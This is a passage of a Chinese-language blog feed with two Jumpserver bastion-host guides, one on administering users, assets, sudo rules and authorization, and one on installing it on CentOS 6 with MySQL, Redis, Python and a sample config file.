&#123;&quot;TYPE&quot;: &quot;server&quot;&#125;, &quot;cn-north-1&quot;: &#123;&quot;TYPE&quot;: &quot;s3&quot;, &quot;BUCKET&quot;: &quot;jumpserver&quot;, &quot;ACCESS_KEY&quot;: &quot;&quot;, &quot;SECRET_KEY&quot;: &quot;&quot;, &quot;REGION&quot;: &quot;cn-north-1&quot;&#125;, &quot;ali-oss&quot;: &#123;&quot;TYPE&quot;: &quot;oss&quot;, &quot;BUCKET&quot;: &quot;jumpserver&quot;, &quot;ACCESS_KEY&quot;: &quot;&quot;, &quot;SECRET_KEY&quot;: &quot;&quot;, &quot;ENDPOINT&quot;: &quot;http://oss-cn-hangzhou.aliyuncs.com&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">注：修改后，需要修改在Jumpserver 会话管理-终端管理 修改terminal的配置 录像存储 命令记录，然后重启 Jumpserver 服务</span><br></pre></td></tr></table></figure><p>1.5 安全设置</p><h2 id="二、创建用户"><a href="#二、创建用户" class="headerlink" title="二、创建用户"></a>二、创建用户</h2><p>2.1 创建 Jumpserver 用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 点击页面左侧“用户列表”菜单下的“用户列表“，进入用户列表页面</span><br><span class="line"># 点击页面左上角“创建用户”按钮，进入创建用户页面，（也可以通过右上角导入模版进行用户导入）</span><br><span class="line"># 其中，用户名即 Jumpserver 登录账号（具有唯一性，不能重名）。名称为页面右上角用户标识（可重复）</span><br><span class="line"># 成功提交用户信息后，Jumpserver 会发送一条设置&quot;用户密码&quot;的邮件到您填写的用户邮箱</span><br><span class="line"># 点击邮件中的设置密码链接，设置好密码后，您就可以用户名和密码登录 Jumpserver 了。</span><br><span class="line"># 用户首次登录 Jumpserver，会被要求完善用户信息，按照向导操作即可。</span><br><span class="line">注：MFA 即 Google Authenticator ，使用此软件需要APP时间与浏览器时间同步</span><br></pre></td></tr></table></figure><h2 id="三、创建资产"><a href="#三、创建资产" class="headerlink" title="三、创建资产"></a>三、创建资产</h2><p>3.1 创建 Linux 资产</p><p>3.1.1 编辑资产树</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 节点不能重名，右击节点可以添加、删除和重命名节点，以及进行资产相关的操作</span><br><span class="line">注：如果有 linux 资产和 windows 资产，建议先建立 Linux 节点与 Windows 节点，不然授权时不好处理</span><br></pre></td></tr></table></figure><p>3.1.2 创建管理用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 管理用户是资产上的 root，或拥有 NOPASSWD: ALL sudo 权限的用户，Jumpserver 使用该用</span><br><span class="line">户来推送系统用户、获取资产硬件信息等</span><br><span class="line"></span><br><span class="line"># 如果使用ssh私钥管理资产，需要先在资产上设置，这里举个例子供参考（本例登录资产使用root为例）</span><br><span class="line">(1). 在资产上生成 root 账户的公钥和私钥</span><br><span class="line"></span><br><span class="line">  $ ssh-keygen -t rsa  # 默认会输入公钥和私钥文件到 ~/.ssh 目录</span><br><span class="line"></span><br><span class="line">(2). 将公钥输出到文件 authorized_keys 文件，并修改权限</span><br><span class="line"></span><br><span class="line">  $ cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">  $ chmod 400 ~/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">(3). 打开RSA验证相关设置</span><br><span class="line"></span><br><span class="line">  $ vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">  RSAAuthentication yes</span><br><span class="line">  PubkeyAuthentication yes</span><br><span class="line">  AuthorizedKeysFile     .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">(4). 重启 ssh 服务</span><br><span class="line">  $ service sshd restart</span><br><span class="line"></span><br><span class="line">(5). 上传 ~/.ssh 目录下的 id_rsa 私钥到 jumpserver 的管理用户中</span><br><span class="line"></span><br><span class="line"># 这样就可以使用 ssh私钥 进行管理服务器</span><br><span class="line"></span><br><span class="line"># 名称可以按资产树来命名。用户名root。密码和 SSH 私钥必填一个</span><br></pre></td></tr></table></figure><p>3.1.3 创建系统用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产用户</span><br><span class="line"># 系统用户的 Sudo 栏设定用户的 sudo 权限</span><br><span class="line"></span><br><span class="line"># 这里简单举几个例子</span><br><span class="line">Sudo /bin/su  # 当前系统用户可以免sudo密码执行sudo su命令</span><br><span class="line"></span><br><span class="line">Sudo /usr/bin/git,/usr/bin/php,/bin/cat,/bin/more,/bin/less,/usr/bin/tail</span><br><span class="line"># 当前系统用户可以免sudo密码执行git php cat more less tail</span><br><span class="line"></span><br><span class="line">Sudo !/usr/bin/yum  # 禁止执行 yum 权限</span><br><span class="line"></span><br><span class="line"># 此处的权限应该根据使用用户的需求汇总后定制，原则上给予最小权限即可</span><br><span class="line"></span><br><span class="line"># 下图为不允许用户执行一些危险的操作，允许其他的所有权限</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 系统用户创建时，如果选择了自动推送 Jumpserver 会使用 Ansible 自动推送系统用户到资产中，</span><br><span class="line">如果资产(交换机、Windows )不支持 Ansible, 请手动填写资产上已有的账号及账号密码</span><br><span class="line"></span><br><span class="line"># 如果不想使用 Jumpserver 推送用户，请去掉自动生成密钥、自动推送勾选。手动填写资产上已有的账号及账号密码</span><br><span class="line"></span><br><span class="line"># 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息</span><br></pre></td></tr></table></figure><p>3.1.4 创建资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 点击页面左侧的“资产管理”菜单下的“资产列表”按钮，查看当前所有的资产列表。</span><br><span class="line"># 点击页面左上角的“创建资产”按钮，进入资产创建页面，填写资产信息。</span><br><span class="line"># IP 地址和管理用户要确保正确，确保所选的管理用户的用户名和密码能&quot;牢靠&quot;地登录指定的 IP 主机上。</span><br><span class="line">资产的系统平台也务必正确填写。公网 IP 信息只用于展示，可不填，Jumpserver 连接资产使用的是 IP 信息。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 资产创建信息填写好保存之后，可测试资产是否能正确连接</span><br><span class="line">注：被连接资产需要python组件，且版本大于等于2.6，Ubuntu等资产默认不允许root用户远程ssh登录，请自行处理</span><br><span class="line"></span><br><span class="line"># 如果资产不能正常连接，请检查管理用户的用户名和密钥是否正确以及该管理用户是否能使用 SSH 从 Jumpserver 主机正确登录到资产主机上</span><br></pre></td></tr></table></figure><p>参考 <a href="http://docs.jumpserver.org/zh/docs/faq_linux.html" target="_blank" rel="noopener">Linux 资产连接说明</a></p><p>3.1.5 网域列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 网域功能是为了解决部分环境无法直接连接而新增的功能，原理是通过网关服务器进行跳转登录</span><br><span class="line"># 点击页面左侧的“网域列表”按钮，查看所有网域列表</span><br><span class="line"># 点击页面左上角的“创建网域”按钮，进入网域创建页面，选择资产里用作网域的网关服务器</span><br><span class="line">注：混合云适用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 点击网域的名称，进入网域详情列表。</span><br><span class="line"># 点击页面的“网关”按钮，选择网关列表的“创建网关”按钮，进入网关创建页面，填写网关信息。</span><br><span class="line"># IP信息一般默认填写网域资产的IP即可（如用作网域的资产有多块网卡和IP地址，选能与jumpserer通信的任一IP即可）</span><br><span class="line">注：用户名与密码可以使用网关资产上已存在的任一拥有执行 ssh 命令权限的用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：保存信息后点击测试连接，确定设置无误后到资产列表添加需要使用网关登录的资产即可。</span><br></pre></td></tr></table></figure><p>3.2 创建 Windows 资产</p><p>3.2.1 创建 Windows 系统管理用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：同 Linux 系统的管理用户一样，名称可以按资产树来命名，用户名是管理员用户名，密码是管理员的密码</span><br></pre></td></tr></table></figure><p>3.2.2 创建 Windows 系统系统用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 目前 Windows 暂不支持自动推送，用户必须在系统中存在且有权限使用远程连接，请确认资产的防火墙已经开放</span><br><span class="line">注：Windows 资产协议务必选择 rdp</span><br><span class="line"></span><br><span class="line"># 如果想让用户登录资产时自己输入密码，可以点击系统用户的名称 点击清除认证信息</span><br></pre></td></tr></table></figure><p>3.2.3 创建 Windows 资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 同创建 Linux 资产一样。</span><br><span class="line"># 创建 Windows 资产，系统平台请选择正确的 Windows，默认 RDP 端口号为3389，IP 和 管理用户请正确选择，</span><br><span class="line">注：确保管理用户能正确登录到指定的 IP 主机上</span><br></pre></td></tr></table></figure><p>参考 <a href="http://docs.jumpserver.org/zh/docs/faq_windows.html" target="_blank" rel="noopener">Windows 资产连接说明</a></p><h2 id="四、资产节点管理"><a href="#四、资产节点管理" class="headerlink" title="四、资产节点管理"></a>四、资产节点管理</h2><p>4.1 为资产树节点分配资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：在资产列表页面，选择要添加资产的节点，右键，选择添加资产到节点(一台资产可以同时在多个节点下面)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：选择要被添加的资产，点击&quot;确认&quot;即可。</span><br></pre></td></tr></table></figure><p>4.2 删除节点资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：选择要被删除的节点，选择&quot;从节点删除&quot;，点击&quot;提交&quot;即可。</span><br></pre></td></tr></table></figure><h2 id="五、创建授权规则"><a href="#五、创建授权规则" class="headerlink" title="五、创建授权规则"></a>五、创建授权规则</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 名称，授权的名称，不能重复</span><br><span class="line"># 用户和用户组二选一，不推荐即选择用户又选择用户组</span><br><span class="line"># 资产和节点二选一，选择节点会包含节点下面的所有资产</span><br><span class="line"># 系统用户，及所选的用户或用户组下的用户能通过该系统用户使用所选节点或者节点下的资产</span><br><span class="line"># 用户（组），资产（节点），系统用户是一对一的关系，所以当拥有 Linux、Windows 不同类型资产时，</span><br><span class="line">应该分别给 Linux 资产和 Windows 资产创建授权规则。</span><br></pre></td></tr></table></figure><p>资产授权与节点授权的区别请参考下面示例，一般情况下，资产授权给个人，节点授权给用户组，一个授权只能选择一个系统用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：创建的授权规则，节点要与资产所在的节点一致</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原则上，一个授权只能同时授予一个用户或者一个组</span><br><span class="line"># 意思是：把个人的资产授权给个人，把部门的资产授权给部门，把项目的资产授权给项目...</span><br><span class="line"># 职责不同，权限就不同，按照职责制定系统用户</span><br><span class="line"># 这样授权就不会乱</span><br></pre></td></tr></table></figure><h2 id="六、用户使用资产"><a href="#六、用户使用资产" class="headerlink" title="六、用户使用资产"></a>六、用户使用资产</h2><p>6.1 登录 Jumpserver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 用户只能看到自己被管理员授权了的资产，如果登录后无资产，请联系管理员进行确认</span><br></pre></td></tr></table></figure><p>6.2 使用资产</p><p>6.2.1 连接资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 点击页面左边的 Web 终端：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 打开资产所在的节点：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 点击资产名字，就连上资产了，整个过程不需要用户输入资产的任何信息</span><br><span class="line"># 如果显示连接超时，请参考FAQ文档进行处理</span><br></pre></td></tr></table></figure><p>6.2.2 断开资产</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 点击页面顶部的 Server 按钮会弹出选个选项，第一个断开所选的连接，第二个断开所有连接。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="Jumpserver" scheme="https://fenghong.tech/tags/Jumpserver/"/>
    
      <category term="Python" scheme="https://fenghong.tech/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>jumpserver安装</title>
    <link href="https://fenghong.tech/jpserver1.html"/>
    <id>https://fenghong.tech/jpserver1.html</id>
    <published>2018-08-18T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CentOS-6-安装文档"><a href="#CentOS-6-安装文档" class="headerlink" title="CentOS 6 安装文档"></a>CentOS 6 安装文档</h1><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li># 开头的行表示注释</li><li>> 开头的行表示需要在 mysql 中执行</li><li>$ 开头的行表示需要执行的命令</li></ul><p>本文档适用于有一定web运维经验的管理员或者工程师，文中不会对安装的软件做过多的解释，仅对需要执行的内容注部分注释，更详细的内容请参考其他安装。</p><p>安装过程中遇到问题可参考 <a href="https://jumpserver.readthedocs.io/zh/docs/faq_install.html" target="_blank" rel="noopener">安装过程中常见的问题</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>系统: CentOS 6</li><li>IP: xx.xx.xx.xx</li><li>目录: /data/data/opt</li><li>数据库: mariadb-10.2.15,用的是开发机上的mysql数据库</li><li>代理: nginx</li></ul><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># 防火墙 与 selinux 设置说明，如果已经关闭了 防火墙 和 Selinux 的用户请跳过设置</span><br><span class="line"></span><br><span class="line"># 修改字符集，否则可能报 input/output error的问题，因为日志里打印了中文，目前未修改</span><br><span class="line">$ localedef -c -f UTF-8 -i zh_CN zh_CN.UTF-8</span><br><span class="line">$ export LC_ALL=zh_CN.UTF-8</span><br><span class="line">$ echo &apos;LANG=&quot;zh_CN.UTF-8&quot;&apos; &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line"># 安装依赖包</span><br><span class="line">$ yum -y install wget sqlite-devel xz gcc automake zlib-devel openssl-devel epel-release git</span><br><span class="line"></span><br><span class="line"># 安装 Redis, Jumpserver 使用 Redis 做 cache 和 celery broke</span><br><span class="line">$ yum -y install redis</span><br><span class="line">$ chkconfig redis on</span><br><span class="line">$ service redis start </span><br><span class="line"></span><br><span class="line"># 安装 MySQL</span><br><span class="line"># 创建数据库 Jumpserver 并授权</span><br><span class="line">$ mysql -uroot</span><br><span class="line">&gt; create database jumpserver default charset &apos;utf8&apos;;</span><br><span class="line">&gt; grant all on jumpserver.* to &apos;jumpserver&apos;@&apos;127.0.0.1&apos; identified by &apos;weakPassword&apos;;</span><br><span class="line">&gt; flush privileges;</span><br><span class="line"></span><br><span class="line"># 安装 Nginx ，用作代理服务器整合 Jumpserver 与各个组件</span><br><span class="line">$ yum -y install nginx</span><br><span class="line">$ chkconfig nginx on</span><br><span class="line"></span><br><span class="line"># 下载编译 Python3.6.1</span><br><span class="line">$ wget https://www.python.org/ftp/python/3.6.1/Python-3.6.1.tar.xz</span><br><span class="line">$ tar xvf Python-3.6.1.tar.xz  &amp;&amp; cd Python-3.6.1</span><br><span class="line">$ ./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"># 配置并载入 Python3 虚拟环境</span><br><span class="line">$ cd /data/opt</span><br><span class="line">$ python3 -m venv py3  # py3 为虚拟环境名称，可自定义</span><br><span class="line">$ source /data/opt/py3/bin/activate  # 退出虚拟环境可以使用 deactivate 命令</span><br><span class="line"></span><br><span class="line"># 看到下面的提示符代表成功，以后运行 Jumpserver 都要先运行以上 source 命令，载入环境后默认以下所有命令均在该虚拟环境中运行</span><br><span class="line">(py3) [root@localhost py3]</span><br><span class="line"></span><br><span class="line"># 自动载入 Python3 虚拟环境</span><br><span class="line">$ cd /data/opt</span><br><span class="line">$ git clone git://github.com/kennethreitz/autoenv.git</span><br><span class="line">$ echo &apos;source /data/opt/autoenv/activate.sh&apos; &gt;&gt; ~/.bashrc</span><br><span class="line">$ source ~/.bashrc</span><br><span class="line"></span><br><span class="line"># 下载 Jumpserver 与 Coco</span><br><span class="line">$ cd /data/opt/</span><br><span class="line">$ git clone https://github.com/jumpserver/jumpserver.git &amp;&amp; cd jumpserver &amp;&amp; git checkout master &amp;&amp; git pull</span><br><span class="line">$ echo &quot;source /data/opt/py3/bin/activate&quot; &gt; /data/opt/jumpserver/.env  # 进入 jumpserver 目录时将自动载入 python 虚拟环境</span><br><span class="line"></span><br><span class="line">$ cd /data/opt/</span><br><span class="line">$ git clone https://github.com/jumpserver/coco.git &amp;&amp; cd coco &amp;&amp; git checkout master &amp;&amp; git pull</span><br><span class="line">$ echo &quot;source /data/opt/py3/bin/activate&quot; &gt; /data/opt/coco/.env  # 进入 coco 目录时将自动载入 python 虚拟环境</span><br><span class="line"></span><br><span class="line"># 安装依赖 RPM 包</span><br><span class="line">$ yum -y install $(cat /data/opt/jumpserver/requirements/rpm_requirements.txt)</span><br><span class="line">$ yum -y install $(cat /data/opt/coco/requirements/rpm_requirements.txt)</span><br><span class="line"></span><br><span class="line"># 安装 Python 库依赖</span><br><span class="line">$ pip install --upgrade pip</span><br><span class="line">$ pip install -r /data/opt/jumpserver/requirements/requirements.txt -i https://pypi.python.org/simple</span><br><span class="line">$ pip install -r /data/opt/coco/requirements/requirements.txt -i https://pypi.python.org/simple</span><br><span class="line"># 修改 Jumpserver 配置文件</span><br><span class="line">$ cd /data/opt/jumpserver</span><br><span class="line">$ cp config_example.py config.py</span><br><span class="line">$ vi config.py</span><br><span class="line"></span><br><span class="line"># 注意对齐，不要直接复制本文档的内容，实际内容以文件为准，本文仅供参考</span><br></pre></td></tr></table></figure><p><strong>注意: 配置文件是 Python 格式，不要用 TAB，而要用空格</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">    jumpserver.config</span><br><span class="line">    ~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">    Jumpserver project setting file</span><br><span class="line"></span><br><span class="line">    :copyright: (c) 2014-2017 by Jumpserver Team</span><br><span class="line">    :license: GPL v2, see LICENSE for more details.</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Config:</span><br><span class="line">    # Use it to encrypt or decrypt data</span><br><span class="line"></span><br><span class="line">    # Jumpserver 使用 SECRET_KEY 进行加密，请务必修改以下设置</span><br><span class="line">    # SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;2vym+ky!997d5kkcc64mnz06y1mmui3lut#(^wd=%s_qj$1%x&apos;</span><br><span class="line">    SECRET_KEY = &apos;请随意输入随机字符串（推荐字符大于等于 50位）&apos;</span><br><span class="line"></span><br><span class="line">    # Django security setting, if your disable debug model, you should setting that</span><br><span class="line">    ALLOWED_HOSTS = [&apos;*&apos;]</span><br><span class="line"></span><br><span class="line">    # DEBUG 模式 True为开启 False为关闭，默认开启，生产环境推荐关闭</span><br><span class="line">    # 注意：如果设置了DEBUG = False，访问8080端口页面会显示不正常，需要搭建 nginx 代理才可以正常访问</span><br><span class="line">    DEBUG = os.environ.get(&quot;DEBUG&quot;) or False</span><br><span class="line"></span><br><span class="line">    # 日志级别，默认为DEBUG，可调整为INFO, WARNING, ERROR, CRITICAL，默认INFO</span><br><span class="line">    LOG_LEVEL = os.environ.get(&quot;LOG_LEVEL&quot;) or &apos;WARNING&apos;</span><br><span class="line">    LOG_DIR = os.path.join(BASE_DIR, &apos;logs&apos;)</span><br><span class="line"></span><br><span class="line">    # 使用的数据库配置，支持sqlite3, mysql, postgres等，默认使用sqlite3</span><br><span class="line">    # See https://docs.djangoproject.com/en/1.10/ref/settings/#databases</span><br><span class="line"></span><br><span class="line">    # 默认使用SQLite3，如果使用其他数据库请注释下面两行</span><br><span class="line">    # DB_ENGINE = &apos;sqlite3&apos;</span><br><span class="line">    # DB_NAME = os.path.join(BASE_DIR, &apos;data&apos;, &apos;db.sqlite3&apos;)</span><br><span class="line"></span><br><span class="line">    # 如果需要使用mysql或postgres，请取消下面的注释并输入正确的信息,本例使用mysql做演示(mariadb也是mysql)</span><br><span class="line">    DB_ENGINE = os.environ.get(&quot;DB_ENGINE&quot;) or &apos;mysql&apos;</span><br><span class="line">    DB_HOST = os.environ.get(&quot;DB_HOST&quot;) or &apos;127.0.0.1&apos;</span><br><span class="line">    DB_PORT = os.environ.get(&quot;DB_PORT&quot;) or 3306</span><br><span class="line">    DB_USER = os.environ.get(&quot;DB_USER&quot;) or &apos;jumpserver&apos;</span><br><span class="line">    DB_PASSWORD = os.environ.get(&quot;DB_PASSWORD&quot;) or &apos;weakPassword&apos;</span><br><span class="line">    DB_NAME = os.environ.get(&quot;DB_NAME&quot;) or &apos;jumpserver&apos;</span><br><span class="line"></span><br><span class="line">    # Django 监听的ip和端口，生产环境推荐把0.0.0.0修改成127.0.0.1，这里的意思是允许x.x.x.x访问，127.0.0.1表示仅允许自身访问</span><br><span class="line">    # ./manage.py runserver 127.0.0.1:8080</span><br><span class="line">    HTTP_BIND_HOST = &apos;127.0.0.1&apos;</span><br><span class="line">    HTTP_LISTEN_PORT = 8080</span><br><span class="line"></span><br><span class="line">    # Redis 相关设置</span><br><span class="line">    REDIS_HOST = os.environ.get(&quot;REDIS_HOST&quot;) or &apos;127.0.0.1&apos;</span><br><span class="line">    REDIS_PORT = os.environ.get(&quot;REDIS_PORT&quot;) or 6379</span><br><span class="line">    REDIS_PASSWORD = os.environ.get(&quot;REDIS_PASSWORD&quot;) or &apos;&apos;</span><br><span class="line">    REDIS_DB_CELERY = os.environ.get(&apos;REDIS_DB&apos;) or 3</span><br><span class="line">    REDIS_DB_CACHE = os.environ.get(&apos;REDIS_DB&apos;) or 4</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, item):</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DevelopmentConfig(Config):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TestConfig(Config):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ProductionConfig(Config):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Default using Config settings, you can write if/else for different env</span><br><span class="line">config = DevelopmentConfig()</span><br><span class="line"># 修改 Coco 配置文件</span><br><span 